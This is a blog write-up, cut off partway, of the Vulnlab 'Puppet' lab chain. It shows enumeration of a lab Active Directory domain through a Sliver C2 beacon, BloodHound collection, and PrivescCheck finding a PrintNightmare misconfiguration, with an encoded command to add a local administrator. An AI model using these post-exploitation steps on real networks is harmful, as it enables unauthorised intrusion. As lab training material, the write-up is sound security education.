<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="VL Puppet" /><meta property="og:locale" content="en" /><meta name="description" content="Puppet is a medium-difficulty chain on Vulnlab in which you are using the sliver c2 framework to compromise a small ad environment. You start with an already existing beacon on file server, escalate privileges via print nightmare and then dump credentials. Afterwards you laterally move to a linux system that is acting as a puppet server, essentially controlling the whole environment. You escalate privileges on the puppet server and use it to move laterally to the domain controller where you dump credentials once more to obtain the final flag." /><meta property="og:description" content="Puppet is a medium-difficulty chain on Vulnlab in which you are using the sliver c2 framework to compromise a small ad environment. You start with an already existing beacon on file server, escalate privileges via print nightmare and then dump credentials. Afterwards you laterally move to a linux system that is acting as a puppet server, essentially controlling the whole environment. You escalate privileges on the puppet server and use it to move laterally to the domain controller where you dump credentials once more to obtain the final flag." /><link rel="canonical" href="https://vuln.dev/vulnlab-puppet/" /><meta property="og:url" content="https://vuln.dev/vulnlab-puppet/" /><meta property="og:site_name" content="xct’s blog" /><meta property="og:image" content="https://vuln.dev/assets/posts/2024-10-27-vl-puppet/preview.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-10-27T00:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://vuln.dev/assets/posts/2024-10-27-vl-puppet/preview.png" /><meta property="twitter:title" content="VL Puppet" /><meta name="twitter:site" content="@xct_de" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-10-27T00:00:00+02:00","datePublished":"2024-10-27T00:00:00+02:00","description":"Puppet is a medium-difficulty chain on Vulnlab in which you are using the sliver c2 framework to compromise a small ad environment. You start with an already existing beacon on file server, escalate privileges via print nightmare and then dump credentials. Afterwards you laterally move to a linux system that is acting as a puppet server, essentially controlling the whole environment. You escalate privileges on the puppet server and use it to move laterally to the domain controller where you dump credentials once more to obtain the final flag.","headline":"VL Puppet","image":"https://vuln.dev/assets/posts/2024-10-27-vl-puppet/preview.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://vuln.dev/vulnlab-puppet/"},"url":"https://vuln.dev/vulnlab-puppet/"}</script><title>VL Puppet | xct's blog</title><link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96"><link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/martin.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">xct's blog</a><p class="site-subtitle fst-italic mb-0">Red Teaming, Windows Exploitation, Training & Labs</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/misc/" class="nav-link"> <i class="fa-fw fas fa-tools"></i> <span>MISC</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://twitter.com/xct_de" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://www.linkedin.com/in/martin-mielke/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="https://www.youtube.com/xct_de" aria-label="youtube" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-youtube"></i> </a> <a href="https://github.com/xct" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>VL Puppet</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>VL Puppet</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1729980000" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Oct 27, 2024 </time> </span><div class="mt-3 mb-3"> <a href="/assets/posts/2024-10-27-vl-puppet/preview.png" class="popup img-link preview-img shimmer"><img src="/assets/posts/2024-10-27-vl-puppet/preview.png" alt="Preview Image" width="1200" height="630" loading="lazy"></a></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/xct_de">xct</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="3620 words" > <em>20 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">VL Puppet</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">VL Puppet</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><p>Puppet is a medium-difficulty chain on Vulnlab in which you are using the sliver c2 framework to compromise a small ad environment. You start with an already existing beacon on file server, escalate privileges via print nightmare and then dump credentials. Afterwards you laterally move to a linux system that is acting as a puppet server, essentially controlling the whole environment. You escalate privileges on the puppet server and use it to move laterally to the domain controller where you dump credentials once more to obtain the final flag.</p><h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We start with a port scan on the only machine that’s available (think of the company giving you an internal machine for the test):</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1

2
3
4
5
6
7

</pre><td class="rouge-code"><pre><span class="go">Host is up (0.024s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8443/tcp  open  https-alt
31337/tcp open  Elite
</span></pre></table></code></div></div><p>Besides ftp and ssh we notice 8443 and 31337 which are rather uncommon ports. Let’s check ftp first:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="go">ftp 10.10.144.231
Connected to 10.10.144.231.
220 (vsFTPd 3.0.5)
Name (10.10.144.231:xct): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">229 Entering Extended Passive Mode (|||38834|)
150 Here comes the directory listing.
-rw----r--    1 0        0            2119 Oct 11 12:32 red_127.0.0.1.cfg
-rwxr-xr-x    1 0        0        36515304 Oct 12 18:17 sliver-client_linux
226 Directory send OK.
</span><span class="gp">ftp&gt;</span><span class="w">
</span></pre></table></code></div></div><p>The ftp share contains a sliver config and also the sliver client for convenience. This company already setup the c2 server for you but doesn’t want to give you shell access on the server. Let’s try to connect. When we check the config we note that it’s connecting to localhost by default:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c">...
</span><span class="go">"lhost":"127.0.0.1",
"lport":31337,
</span><span class="c">...
</span></pre></table></code></div></div><p>An easy fix is running socat to redirect traffic from local port 31337 to the remote machine:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.10.144.231:31337
</span></pre></table></code></div></div><p>Now we can import the config and start the sliver client:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="gp">./sliver-client_linux import $</span>PWD/red_127.0.0.1.cfg
<span class="go">
Connecting to 127.0.0.1:31337 ...
[*] Loaded 20 aliases from disk
[*] Loaded 105 extension(s) from disk

██████ ██▓ ██▓ ██▒ █▓▓█████ ██▀███
▒██ ▒ ▓██▒ ▓██▒▓██░ █▒▓█ ▀ ▓██ ▒ ██▒
░ ▓██▄ ▒██░ ▒██▒ ▓██ █▒░▒███ ▓██ ░▄█ ▒
▒ ██▒▒██░ ░██░ ▒██ █░░▒▓█ ▄ ▒██▀▀█▄
▒██████▒▒░██████▒░██░ ▒▀█░ ░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░ ▒░▓ ░░▓ ░ ▐░ ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒ ░ ░░ ░ ▒ ░ ▒ ░ ░ ░░ ░ ░ ░ ░▒ ░ ▒░
░ ░ ░ ░ ░ ▒ ░ ░░ ░ ░░ ░
░ ░ ░ ░ ░ ░ ░ ░

All hackers gain conspire
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

</span><span class="gp">sliver &gt;</span><span class="w">
</span></pre></table></code></div></div><p>Running the <code class="language-plaintext highlighter-rouge">beacons</code> command shows that a beacon is already connected to this server:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5

</pre><td class="rouge-code"><pre><span class="gp">sliver &gt;</span><span class="w"> </span>beacons
<span class="go">
 ID         Name          Transport   Hostname   Username             Operating System   Last Check-In   Next Check-In
========== ============= =========== ========== ==================== ================== =============== ===============
 56d068c7   puppet-mtls   mtls        File01     PUPPET\Bruce.Smith   windows/amd64      6s              26s
</span></pre></table></code></div></div><p>We can now either interact with the beacon or switch to a faster interactive session. For this lab I’m going to work with a session but note that on real engagements working with a beacon is usually preferred for evasion purposes. Beacons sleep between command executions and most c2 frameworks apply obfuscation while those sleeps are occurring. When switching to interactive session, no sleeps occur anymore so this evasion component is lost. Let’s switch to the session then:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="go">
[*] Active beacon puppet-mtls (56d068c7-b273-4b0e-aabf-327b0a632eb0)

</span><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>interactive
<span class="go">
[*] Using beacon's active C2 endpoint: mtls://pm01.puppet.vl:8443
[*] Tasked beacon puppet-mtls (71bf6b46)
[*] Session 6e7673eb puppet-mtls - 10.10.144.230:50522 (File01) - windows/amd64 - Thu, 17 Oct 2024 13:21:43 CEST

</span><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>use 6e7673eb
<span class="go">
[*] Active session puppet-mtls (6e7673eb-db33-4756-b7e9-8e9238c92aa4)

</span><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w">
</span></pre></table></code></div></div><p>We are now going to do some local enumeration, first of all browsing the file system we note that puppet is installed:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12

</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span><span class="nb">cd </span>c:<span class="se">\\</span>programdata
<span class="go">
[*] C:\programdata

</span><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">
C:\programdata (17 items, 4.6 KiB)
==================================
</span><span class="c">...
</span><span class="gp">drwxrwxrwx Puppet &lt;dir&gt;</span><span class="w"> </span>Sat Oct 12 04:42:37 <span class="nt">-0700</span> 2024
<span class="gp">drwxrwxrwx PuppetLabs &lt;dir&gt;</span><span class="w"> </span>Fri Oct 11 06:07:15 <span class="nt">-0700</span> 2024
<span class="c">...
</span></pre></table></code></div></div><p><a href="https://www.puppet.com/">Puppet</a> is a tool for configuration management - in a way similar to our c2 framework :) This means there is somewhere a puppet server which is controlling machines of the environment. Next we want to know which context we are running in - to see this we are going to run the <code class="language-plaintext highlighter-rouge">sa-whoami</code> beacon object file (bof):</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29

</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>sa-whoami
<span class="go">
[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:

UserName SID
====================== ====================================
PUPPET\Bruce.Smith S-1-5-21-3066630505-2324057459-3046381011-1126

GROUP INFORMATION Type SID Attributes
================================================= ===================== ============================================= ==================================================
PUPPET\Domain Users Group S-1-5-21-3066630505-2324057459-3046381011-513 Mandatory group, Enabled by default, Enabled group,
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group,
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group,
CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group,
LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group,
PUPPET\employees Group S-1-5-21-3066630505-2324057459-3046381011-1105 Mandatory group, Enabled by default, Enabled group,
Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group,
Mandatory Label\Medium Mandatory Level Label S-1-16-8192 Mandatory group, Enabled by default, Enabled group,

Privilege Name Description State
============================= ================================================= ===========================
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</span></pre></table></code></div></div><p>Note that we are a domain user of the “employees” group but don’t seem to have any special privileges. Our next step is gathering data about the ad environment via Bloodhound. We can directly run the sharp-hound-4 assembly from the sliver armory to achieve this:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24

</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span><span class="nb">cd </span>c:<span class="se">\\</span>temp
<span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>sharp-hound-4 <span class="nt">-s</span> <span class="nt">-t</span> 300 <span class="nt">--</span> <span class="nt">-c</span> all,gpolocalgroup
<span class="go">
[*] sharp-hound-4 output:
2024-10-17T04:33:04.4654394-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-10-17T04:33:04.8250883-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-17T04:33:04.8882233-07:00|INFORMATION|Initializing SharpHound at 4:33 AM on 10/17/2024
2024-10-17T04:33:05.2644779-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for puppet.vl : DC01.puppet.vl
2024-10-17T04:33:05.3589164-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-17T04:33:05.7343716-07:00|INFORMATION|Beginning LDAP search for puppet.vl
2024-10-17T04:33:05.8288053-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-10-17T04:33:05.8288053-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-10-17T04:33:36.0752344-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 39 MB RAM
2024-10-17T04:34:02.4117649-07:00|INFORMATION|Consumers finished, closing output channel
2024-10-17T04:34:03.0560925-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-10-17T04:34:04.1011067-07:00|INFORMATION|Status: 126 objects finished (+126 2.172414)/s -- Using 49 MB RAM
2024-10-17T04:34:04.1323414-07:00|INFORMATION|Enumeration finished in 00:00:58.3942019
2024-10-17T04:34:04.2889989-07:00|INFORMATION|Saving cache with stats: 85 ID to type mappings.
 87 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-10-17T04:34:04.3046319-07:00|INFORMATION|SharpHound Enumeration Completed at 4:34 AM on 10/17/2024! Happy Graphing!
</span></pre></table></code></div></div><p>Note that this saves the output as a zip on the target machine, we still have to download it:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>download 20241017043355_BloodHound.zip
<span class="go">
[*] Wrote 13759 bytes (1 file successfully, 0 files unsuccessfully) to /home/xct/vl/puppet/20241017043355_BloodHound.zip
</span></pre></table></code></div></div><p>Afterwards we immediately remove the files on the target machine. We load the files into our local BloodHound instance but can’t see any particularly interesting paths. As a next step, we run the <code class="language-plaintext highlighter-rouge">sa-adcs-enum</code> bof to enumerate any potential ADCS instances:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="go">sa-adcs-enum

[*] Successfully executed sa-adcs-enum (coff-loader)
[*] Got output:

[*] Found 0 CAs in the domain

adcs_enum SUCCESS.
</span></pre></table></code></div></div><p>There are however none. Additionally we enumerate open ports the local machine via another bof:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28

</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>sa-netstat
<span class="go">
[*] Successfully executed sa-netstat (coff-loader)
[*] Got output:
Processing: 14 Entries
  PROTO SRC                    DST                          STATE                                                                     PROCESS   PID
  TCP  0.0.0.0:135            LISTEN                   LISTENING                                                                             (  856)
  TCP  0.0.0.0:445            LISTEN                   LISTENING                                                                             (    4)
  TCP  0.0.0.0:3389           LISTEN                   LISTENING                                                                             ( 1020)
  TCP  0.0.0.0:5985           LISTEN                   LISTENING                                                                             (    4)
  TCP  0.0.0.0:47001          LISTEN                   LISTENING                                                                             (    4)
  TCP  0.0.0.0:49664          LISTEN                   LISTENING                                                                             (  676)
  TCP  0.0.0.0:49665          LISTEN                   LISTENING                                                                             (  532)
  TCP  0.0.0.0:49666          LISTEN                   LISTENING                                                                             (  732)
  TCP  0.0.0.0:49667          LISTEN                   LISTENING                                                                             (  676)
  TCP  0.0.0.0:49668          LISTEN                   LISTENING                                                                             ( 1844)
  TCP  0.0.0.0:49669          LISTEN                   LISTENING                                                                             ( 1012)
  TCP  0.0.0.0:49673          LISTEN                   LISTENING                                                                             (  656)
  TCP  10.10.144.230:139      LISTEN                   LISTENING                                                                             (    4)
  TCP  10.10.144.230:50522    10.10.144.231:8443     ESTABLISHED                                     C:\ProgramData\Puppet\puppet-update.exe ( 4068)
  UDP  0.0.0.0:123            *:*                                                                                                            (  652)
  UDP  0.0.0.0:3389           *:*                                                                                                            ( 1020)
  UDP  0.0.0.0:5353           *:*                                                                                                            ( 1064)
  UDP  0.0.0.0:5355           *:*                                                                                                            ( 1064)
  UDP  10.10.144.230:137      *:*                                                                                                            (    4)
  UDP  10.10.144.230:138      *:*                                                                                                            (    4)
  UDP  127.0.0.1:52613        *:*                                                        C:\ProgramData\Puppet\puppet-update.exe             ( 4068)
  UDP  127.0.0.1:62913        *:*                                                                                                            (  676)
</span></pre></table></code></div></div><p>Nothing particular interesting sticks out. As a next step we look for local privilege escalation vulnerabilities. A good PowerShell script to use for this is <a href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a> by itm4n. Since we can not reach our attacker machine directly from the target machine, we will have to either upload the script to the target or host in on the c2 machine. In this case I’m going with the upload way:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>upload PrivescCheck.ps1
<span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>sharpsh <span class="nt">-t</span> 300 <span class="nt">--</span> <span class="nt">-c</span> invoke-privesccheck <span class="nt">-u</span> c:<span class="se">\\</span>temp<span class="se">\\</span>PrivescCheck.ps1
<span class="go">
</span><span class="c">...
</span><span class="go">[*] Status: Vulnerable - High

Policy : Limits print driver installation to Administrators
Key : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value : RestrictDriverInstallationToAdministrators
Data : 0
Default : 1
</span><span class="gp">Expected : &lt;null|1&gt;</span><span class="w">
</span><span class="go">Description : Installing printer drivers does not require administrator privileges.

</span><span class="gp">Policy : Point and Print Restrictions &gt;</span><span class="w"> </span>NoWarningNoElevationOnInstall
<span class="go">Key : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value : NoWarningNoElevationOnInstall
Data : 1
Default : 0
</span><span class="gp">Expected : &lt;null|0&gt;</span><span class="w">
</span><span class="go">Description : Do not show warning or elevation prompt. Note: this setting reintroduces the PrintNightmare LPE
vulnerability, even if the settings 'InForest' and/or 'TrustedServers' are configured.
</span><span class="c">...
</span></pre></table></code></div></div><p>The machine is vulnerable to <a href="https://itm4n.github.io/printnightmare-exploitation/">PrintNightmare</a> due to a misconfiguration! There are many ways to exploit this, for simplicity I’m going to go with a PoC from this <a href="https://github.com/JohnHammond/CVE-2021-34527">repo</a>. PrintNightmare essentially loads a attacker-controlled DLL as SYSTEM so you could also create your own DLL to load a sliver beacon directly.</p><p>However the PoC by John Hammond allows to use a precompiled DLL to add a new administrator user. While this is easy to detect it’s a quick way to achieve what we want here. We use <code class="language-plaintext highlighter-rouge">sharpsh</code> once more to run the PoC and add a new local admin:</p><p><a href="https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')&amp;input=SW52b2tlLU5pZ2h0bWFyZSAtRHJpdmVyTmFtZSAiWGVyb3gzMDEwIiAtTmV3VXNlciAicmVkcHVwcGV0IiAtTmV3UGFzc3dvcmQgIlJlZFB1cHBldDEyMyI">Encoded Command</a></p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter 